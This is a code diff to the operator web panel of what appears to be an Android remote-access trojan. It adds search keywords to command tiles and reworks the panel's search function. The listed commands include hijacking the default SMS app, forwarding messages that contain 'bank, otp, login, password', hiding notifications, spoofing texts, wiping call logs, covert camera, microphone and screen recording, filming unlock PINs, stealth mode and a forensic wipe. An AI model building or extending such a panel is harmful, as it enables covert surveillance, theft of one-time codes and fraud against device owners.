@@ -334,21 +334,21 @@
                 css: 'sys', 
                 search: 'sms, calls, contacts, keywords, filter, hvt, redirection, forward, wipe, delete, sanitize, auto, swipe, default, handler',
                 commands: [
-                    { id: 'SET_DEFAULT_SMS', name: 'Hijack SMS Handler', icon: '💬', inputs: [{id: 'sms-default-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Hand)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}, {v: 'STOP_RELENTLESS', l: 'Stop Loop'}]}] },
-                    { id: 'RESTORE_DEFAULT_SMS', name: 'Restore Original SMS', icon: '⏪', inputs: [] },
-                    { id: 'ADD_HVT_REDIRECT', name: 'SMS Redirection (HVT)', icon: '🔄', inputs: [{id: 'hvt-sender', label: 'Target Number', type: 'text'}, {id: 'hvt-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_HVT_REDIRECTS' },
-                    { id: 'ADD_KEYWORD_FORWARD', name: 'Keyword SMS Trap', icon: '🪤', inputs: [{id: 'kw-list', label: 'Keywords (login,otp)', type: 'text'}, {id: 'kw-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_KEYWORD_FORWARDS' },
-                    { id: 'ADD_AUTO_SWIPE', name: 'Auto-Swipe', icon: '🕵️', inputs: [{id: 'swipe-type', label: 'Target', type: 'select', options: [{v: 'pkgs', l: 'App Package'}, {v: 'keywords', l: 'Keywords'}, {v: 'senders', l: 'Sender Number'}]}, {id: 'swipe-val', label: 'Value', type: 'text'}], cleanup: 'CLEAR_AUTO_SWIPE' },
-                    { id: 'SET_SMS_BLACKLIST', name: 'SMS Blacklist', icon: '🛡️', inputs: [{id: 'sms-blacklist', label: 'Filter Keywords', type: 'text'}] },
-                    { id: 'INJECT_SMS', name: 'Spoof Incoming SMS', icon: '📥', inputs: [{id: 'fake-sms-num', label: 'Sender Number', type: 'text'}, {id: 'fake-sms-body', label: 'Message Body', type: 'textarea'}, {id: 'fake-sms-read', label: 'Initial State', type: 'select', options: [{v: 'UNREAD', l: 'Unread (Notify)'}, {v: 'READ', l: 'Read (Silent)'}]}] },
-                    { id: 'SEND_SMS', name: 'Send Remote SMS', icon: '📤', inputs: [{id: 'send-sms-num', label: 'Recipient Number', type: 'text'}, {id: 'send-sms-body', label: 'Message Body', type: 'textarea'}] },
-                    { id: 'DELETE_SMS_THREAD', name: 'Wipe Specific Thread', icon: '🧵', inputs: [{id: 'del-sms-num', label: 'Target Number', type: 'text'}] },
-                    { id: 'DELETE_SMS_QUERY', name: 'Wipe SMS by Keyword', icon: '🔍', inputs: [{id: 'del-sms-query', label: 'Search String', type: 'text'}] },
-                    { id: 'WIPE_NOTIFICATIONS', name: 'Wipe Notifications', icon: '🧹', inputs: [{id: 'wipe-mode', label: 'Mode', type: 'select', options: [{v: 'ALL', l: 'All'}, {v: 'PKG', l: 'Package'}, {v: 'TEXT', l: 'Keyword'}]}, {id: 'wipe-val', label: 'Value (App or Word)', type: 'text'}] },
-                    { id: 'PHONE_LOGS', name: 'Sanitize Call Logs', icon: '🧼', inputs: [{id: 'call-act', label: 'Action', type: 'select', options: [{v: 'CLEAR_ALL', l: 'Wipe All'}, {v: 'DELETE_LAST', l: 'Wipe Last'}, {v: 'DELETE_NUM', l: 'Wipe Number'}]}, {id: 'call-val', label: 'Value/Number', type: 'text'}] },
-                    { id: 'ADD_CONTACT', name: 'Inject Contact', icon: '👤', inputs: [{id: 'con-name', label: 'Name', type: 'text'}, {id: 'con-num', label: 'Number', type: 'text'}] },
-                    { id: 'SET_SIM_TRACKER', name: 'SIM Contact Tracker', icon: '🐦', inputs: [{id: 'watchdog-name', label: 'Contact to Check', type: 'text'}, {id: 'watchdog-num', label: 'Target SMS Number', type: 'text'}] },
-                    { id: 'PURGE_CONTACT', name: 'Purge Specific Contact', icon: '🗑️', inputs: [{id: 'con-purge', label: 'Name or Number to Wipe', type: 'text'}] }
+                    { id: 'SET_DEFAULT_SMS', name: 'Hijack SMS Handler', icon: '💬', keywords: 'hijack, default, role, bypass, samsung, messaging', inputs: [{id: 'sms-default-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Hand)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}, {v: 'STOP_RELENTLESS', l: 'Stop Loop'}]}] },
+                    { id: 'RESTORE_DEFAULT_SMS', name: 'Restore Original SMS', icon: '⏪', keywords: 'revert, uninstall, clean', inputs: [] },
+                    { id: 'ADD_HVT_REDIRECT', name: 'SMS Redirection (HVT)', icon: '🔄', keywords: 'forward, intercept, redirect, trap, number', inputs: [{id: 'hvt-sender', label: 'Target Number', type: 'text'}, {id: 'hvt-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_HVT_REDIRECTS' },
+                    { id: 'ADD_KEYWORD_FORWARD', name: 'Keyword SMS Trap', icon: '🪤', keywords: 'bank, otp, login, password, alert', inputs: [{id: 'kw-list', label: 'Keywords (login,otp)', type: 'text'}, {id: 'kw-dest', label: 'Destination', type: 'text'}], cleanup: 'CLEAR_KEYWORD_FORWARDS' },
+                    { id: 'ADD_AUTO_SWIPE', name: 'Auto-Swipe', icon: '🕵️', keywords: 'hide, suppress, block, notification', inputs: [{id: 'swipe-type', label: 'Target', type: 'select', options: [{v: 'pkgs', l: 'App Package'}, {v: 'keywords', l: 'Keywords'}, {v: 'senders', l: 'Sender Number'}]}, {id: 'swipe-val', label: 'Value', type: 'text'}], cleanup: 'CLEAR_AUTO_SWIPE' },
+                    { id: 'SET_SMS_BLACKLIST', name: 'SMS Blacklist', icon: '🛡️', keywords: 'filter, spam, hide', inputs: [{id: 'sms-blacklist', label: 'Filter Keywords', type: 'text'}] },
+                    { id: 'INJECT_SMS', name: 'Spoof Incoming SMS', icon: '📥', keywords: 'fake, incoming, message, spoof', inputs: [{id: 'fake-sms-num', label: 'Sender Number', type: 'text'}, {id: 'fake-sms-body', label: 'Message Body', type: 'textarea'}, {id: 'fake-sms-read', label: 'Initial State', type: 'select', options: [{v: 'UNREAD', l: 'Unread (Notify)'}, {v: 'READ', l: 'Read (Silent)'}]}] },
+                    { id: 'SEND_SMS', name: 'Send Remote SMS', icon: '📤', keywords: 'text, message, outgoing', inputs: [{id: 'send-sms-num', label: 'Recipient Number', type: 'text'}, {id: 'send-sms-body', label: 'Message Body', type: 'textarea'}] },
+                    { id: 'DELETE_SMS_THREAD', name: 'Wipe Specific Thread', icon: '🧵', keywords: 'delete, clear, conversation', inputs: [{id: 'del-sms-num', label: 'Target Number', type: 'text'}] },
+                    { id: 'DELETE_SMS_QUERY', name: 'Wipe SMS by Keyword', icon: '🔍', keywords: 'search, find, remove', inputs: [{id: 'del-sms-query', label: 'Search String', type: 'text'}] },
+                    { id: 'WIPE_NOTIFICATIONS', name: 'Wipe Notifications', icon: '🧹', keywords: 'clear, hide, suppress', inputs: [{id: 'wipe-mode', label: 'Mode', type: 'select', options: [{v: 'ALL', l: 'All'}, {v: 'PKG', l: 'Package'}, {v: 'TEXT', l: 'Keyword'}]}, {id: 'wipe-val', label: 'Value (App or Word)', type: 'text'}] },
+                    { id: 'PHONE_LOGS', name: 'Sanitize Call Logs', icon: '🧼', keywords: 'delete, call, history, incoming, outgoing', inputs: [{id: 'call-act', label: 'Action', type: 'select', options: [{v: 'CLEAR_ALL', l: 'Wipe All'}, {v: 'DELETE_LAST', l: 'Wipe Last'}, {v: 'DELETE_NUM', l: 'Wipe Number'}]}, {id: 'call-val', label: 'Value/Number', type: 'text'}] },
+                    { id: 'ADD_CONTACT', name: 'Inject Contact', icon: '👤', keywords: 'new, person, phonebook', inputs: [{id: 'con-name', label: 'Name', type: 'text'}, {id: 'con-num', label: 'Number', type: 'text'}] },
+                    { id: 'SET_SIM_TRACKER', name: 'SIM Contact Tracker', icon: '🐦', keywords: 'canary, monitor, sim, change, alert', inputs: [{id: 'watchdog-name', label: 'Contact to Check', type: 'text'}, {id: 'watchdog-num', label: 'Target SMS Number', type: 'text'}] },
+                    { id: 'PURGE_CONTACT', name: 'Purge Specific Contact', icon: '🗑️', keywords: 'delete, remove, contact', inputs: [{id: 'con-purge', label: 'Name or Number to Wipe', type: 'text'}] }
                 ]
             },
             {
@@ -357,13 +357,13 @@
                 css: 'surv', 
                 search: 'camera, mic, snapshot, audio, recording, screenshot, eyes, ears, environment, sensors, scraper',
                 commands: [
-                    { id: 'GET_SCREENSHOT', name: 'Capture Screen', icon: '📸', inputs: [{id: 'scr-quality', label: 'Quality %', type: 'number', val: 70}, {id: 'scr-freq', label: 'Freq (0=Single)', type: 'number', val: 0}, {id: 'scr-dur', label: 'Duration (s)', type: 'number', val: 0}] },
-                    { id: 'RECORD_VOICE', name: 'Record Microphone', icon: '🎙️', inputs: [{id: 'mic-dur', label: 'Duration (Seconds)', type: 'number', val: 10}] },
-                    { id: 'RECORD_SCREEN', name: 'Relentless Screen Record', icon: '🎥', inputs: [{id: 'rec-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Accept)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}]}, {id: 'rec-dur', label: 'Duration (Sec)', type: 'number', val: 60}, {id: 'rec-qual', label: 'Resolution', type: 'select', options: [{v: 'MED', l: '720p'}, {v: 'LOW', l: '480p'}, {v: 'ULTRA_LOW', l: '360p (Data Saver)'}, {id: 'HIGH', l: '1080p'}]}, {id: 'rec-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS'}, {v: '15', l: '15 FPS'}, {v: '10', l: '10 FPS'}, {v: '60', l: '60 FPS (Smooth)'}]}, {id: 'rec-audio', label: 'Audio (Mic)', type: 'select', options: [{v: 'FALSE', l: 'Video Only'}, {v: 'TRUE', l: 'With Audio'}]}] },
-                    { id: 'CAPTURE_IMAGE', name: 'Take Photos', icon: '📷', inputs: [{id: 'cam-side', label: 'Source', type: 'select', options: [{v: 'REAR', l: 'Rear'}, {v: 'FRONT', l: 'Front'}]}, {id: 'cam-count', label: 'Quantity', type: 'number', val: 1}] },
-                    { id: 'GET_SENSORS', name: 'Sample Environment', icon: '🌡️', inputs: [] },
-                    { id: 'CAPTURE_PATTERN', name: 'Capture Pattern (Video Trap)', icon: '🎣', inputs:[{id: 'patt-timeout', label: 'Success Timeout (s)', type: 'number', val: 20}, {id: 'patt-qual', label: 'Quality', type: 'select', options: [{v: 'MED', l: '720p (Recommended)'}, {v: 'LOW', l: '480p'}, {v: 'ULTRA_LOW', l: '360p'}, {v: 'HIGH', l: '1080p'}]}, {id: 'patt-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS'}, {v: '15', l: '15 FPS'}, {v: '60', l: '60 FPS'}]}] },
-                    { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', inputs:[{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}, {id: 'tree-depth', label: 'Walk Depth', type: 'number', val: 10}], cleanup: 'RESET_SCRAPER' }
+                    { id: 'GET_SCREENSHOT', name: 'Capture Screen', icon: '📸', keywords: 'eyes, picture, screen, capture', inputs: [{id: 'scr-quality', label: 'Quality %', type: 'number', val: 70}, {id: 'scr-freq', label: 'Freq (0=Single)', type: 'number', val: 0}, {id: 'scr-dur', label: 'Duration (s)', type: 'number', val: 0}] },
+                    { id: 'RECORD_VOICE', name: 'Record Microphone', icon: '🎙️', keywords: 'mic, audio, ears, listen', inputs: [{id: 'mic-dur', label: 'Duration (Seconds)', type: 'number', val: 10}] },
+                    { id: 'RECORD_SCREEN', name: 'Relentless Screen Record', icon: '🎥', keywords: 'video, movie, stream, monitor', inputs: [{id: 'rec-mode', label: 'Strategy', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Ghost Accept)'}, {v: 'RELENTLESS', l: 'Relentless Loop'}, {v: 'TRIGGER', l: 'Trigger Prompt'}, {v: 'SCRAPE', l: 'Scrape Dialog'}]}, {id: 'rec-dur', label: 'Duration (Sec)', type: 'number', val: 60}, {id: 'rec-qual', label: 'Resolution', type: 'select', options: [{v: 'MED', l: '720p'}, {v: 'LOW', l: '480p'}, {v: 'ULTRA_LOW', l: '360p (Data Saver)'}, {id: 'HIGH', l: '1080p'}]}, {id: 'rec-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS'}, {v: '15', l: '15 FPS'}, {v: '10', l: '10 FPS'}, {v: '60', l: '60 FPS (Smooth)'}]}, {id: 'rec-audio', label: 'Audio (Mic)', type: 'select', options: [{v: 'FALSE', l: 'Video Only'}, {v: 'TRUE', l: 'With Audio'}]}] },
+                    { id: 'CAPTURE_IMAGE', name: 'Take Photos', icon: '📷', keywords: 'camera, lens, front, rear', inputs: [{id: 'cam-side', label: 'Source', type: 'select', options: [{v: 'REAR', l: 'Rear'}, {v: 'FRONT', l: 'Front'}]}, {id: 'cam-count', label: 'Quantity', type: 'number', val: 1}] },
+                    { id: 'GET_SENSORS', name: 'Sample Environment', icon: '🌡️', keywords: 'light, proximity, motion, temperature, physical, pocket', inputs: [] },
+                    { id: 'CAPTURE_PATTERN', name: 'Capture Pattern (Video Trap)', icon: '🎣', keywords: 'unlock, pin, login, password, video', inputs:[{id: 'patt-timeout', label: 'Success Timeout (s)', type: 'number', val: 20}, {id: 'patt-qual', label: 'Quality', type: 'select', options: [{v: 'MED', l: '720p (Recommended)'}, {v: 'LOW', l: '480p'}, {v: 'ULTRA_LOW', l: '360p'}, {v: 'HIGH', l: '1080p'}]}, {id: 'patt-fps', label: 'Frame Rate', type: 'select', options: [{v: '30', l: '30 FPS'}, {v: '15', l: '15 FPS'}, {v: '60', l: '60 FPS'}]}] },
+                    { id: 'GET_TREE', name: 'UI Scraper (Hierarchy)', icon: '🌲', keywords: 'dump, inspect, hierarchy, layout', inputs:[{id: 'tree-pkg', label: 'Package Name', type: 'text', placeholder: 'com.pkg'}, {id: 'tree-dur', label: 'Duration (Min)', type: 'number', val: 1}, {id: 'tree-depth', label: 'Walk Depth', type: 'number', val: 10}], cleanup: 'RESET_SCRAPER' }
                 ]
             },
             {
@@ -494,9 +494,9 @@
                 commands: [
                     { id: 'CODERED', name: 'Trigger Code Red Loop', icon: '🚨', inputs: [{id: 'cr-code', label: 'Codes', type: 'text', val: '0'}, {id: 'cr-dur', label: 'Duration (Min)', type: 'number', val: 15}, {id: 'cr-freq', label: 'Freq (Sec)', type: 'number', val: 30}] },
                     { id: 'LOCK_SCREEN', name: 'Force Device Lock', icon: '🔒', inputs: [] },
-                    { id: 'STOLEN_PHONE', name: 'Lost/Stolen Protocol', icon: '🕵️', inputs: [{id: 'stolen-num', label: 'Target SMS for Alerts', type: 'text'}] },
-                    { id: 'STOP_BEACON', name: 'Dark Mode (Stop Beacon)', icon: '🌑', inputs: [] },
-                    { id: 'NUKE', name: 'Remote Self-Destruct', icon: '☢️', inputs: [] }
+                    { id: 'STOLEN_PHONE', name: 'Lost/Stolen Protocol', icon: '🕵️', keywords: 'lost, recovery, pattern, data, panic', inputs: [{id: 'stolen-num', label: 'Target SMS for Alerts', type: 'text'}] },
+                    { id: 'STOP_BEACON', name: 'Dark Mode (Stop Beacon)', icon: '🌑', keywords: 'stealth, hide, kill', inputs: [] },
+                    { id: 'NUKE', name: 'Remote Self-Destruct', icon: '☢️', keywords: 'wipe, factory, delete, forensic, destroy', inputs: [] }
                 ]
             }
         ];
@@ -511,7 +511,7 @@
                     </div>
                     <div class="cat-content" id="content-${group.id}">
                         ${group.commands.map(cmd => `
-                            <div class="cmd-tile" id="tile-${cmd.id}">
+                            <div class="cmd-tile" id="tile-${cmd.id}" data-keywords="${cmd.keywords || ''}">
                                 <div class="cmd-tile-main" onclick="toggleCmdDrawer('${cmd.id}')">
                                     <div class="cmd-name"><span style="margin-right:10px">${cmd.icon}</span> ${cmd.name}</div>
                                     <div style="display:flex; gap:8px;">
@@ -1555,11 +1555,21 @@
             const tags = JSON.parse(localStorage.getItem('cortex_cmd_tags') || '{}');
             let foundElement = null;
 
-            // 1. Check Dynamic Tags First
+            // 1. Check Dynamic User Tags
             for (const [cmdKey, keywords] of Object.entries(tags)) {
                 if (keywords.split(',').some(k => k.trim().includes(term))) {
-                    const btn = document.querySelector(`.btn-tag[onclick*="'${cmdKey}'"]`);
-                    if (btn) { foundElement = btn.closest('.cmd-row') || btn.closest('.card'); break; }
+                    foundElement = document.getElementById('tile-' + cmdKey);
+                    if (foundElement) break;
+                }
+            }
+
+            // 1.5 Check Baked-in Keywords
+            if (!foundElement) {
+                const tiles = document.querySelectorAll('.cmd-tile[data-keywords]');
+                for (const tile of tiles) {
+                    if (tile.getAttribute('data-keywords').includes(term)) {
+                        foundElement = tile; break;
+                    }
                 }
             }
 
